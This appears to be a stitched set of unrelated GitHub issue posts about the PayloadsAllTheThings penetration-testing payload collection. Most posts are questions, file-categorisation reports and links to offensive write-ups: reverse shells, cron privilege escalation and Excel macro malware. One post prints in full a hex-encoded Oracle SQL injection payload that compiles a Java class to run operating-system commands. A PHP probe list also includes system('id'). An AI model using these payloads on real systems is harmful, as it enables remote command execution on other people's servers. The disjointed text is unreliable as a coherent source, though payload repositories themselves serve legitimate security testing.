I start with :)

PHP:
- phpinfo
- getmypid
- getmygid
- getmyuid
- phpcredit
- ;print(md5(msg));
- system('id')
.jsw, .jsv, .jspf    Under what circumstances can these three suffix names resolve
PayloadsAllTheThings/File Inclusion/Intruders/Logs-files.txt doesn't have any log file
Do you have anything that is specific to serverless infrastructure injection detection via known error inducing vectors or OOB requests that are pretty general as far as targetting nonspecific implementations?
![image](https://user-images.githubusercontent.com/22231287/70525536-e1043a00-1b47-11ea-8409-9510d8169ecd.png)

Hey, bro
I run your hex code:
/* create Java class */
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;

got this pic error, how can I resolve it?
The two files in `/Server Side Template Injection/Intruder` (`JHADDIX_SSI_injection.txt`, `ssi_quick.txt`) are incorrectly categorised as Server Side Template Injection payloads when they are in fact Server Side Includes Injection payloads. Furthermore, the two files in `/Server Side Template Injection/Files` (`SSRF_expect.svg`, `SSRF_url.svg`) appear to be files related to Server Side Request Forgery.

Proof:
* [JHADDIX_SSI_injection.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/JHADDIX_SSI_Injection.txt)
* [ssi_quick.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssi_quick.txt)
* [SSRF_expect.svg](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Files/SSRF_expect.svg)
* [SSRF_url.svg](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Files/SSRF_url.svg)

The README.md details correct information and sample payloads for testing SSTI for a variety of different templating engines. Would it be possible to push a commit replacing these files with relevant SSTI payloads?



 
File types:
- xlm
- xls
- xlsx

Resources:

- https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm

- https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware
https://github.com/ajdumanhug/ctf/blob/master/web/xxe/csaw-unagi-web-200.md
writeup https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere
Cron jobs privilege escalation:
https://0xsp.com/mongoose-linux-exploit-toolkit/ref-001-cron-jobs-privilege-escalation

Red Teaming Toolkit Collection:
https://0xsp.com/offensive/red-teaming-toolkit-collection

Reverse Shell with password protection:
https://0xsp.com/offensive/reverse-shell-with-password

Remote Powershell execution via Lazarus Process unit:
https://0xsp.com/offensive/remote-powershell-execution-via-lazarus-process-unit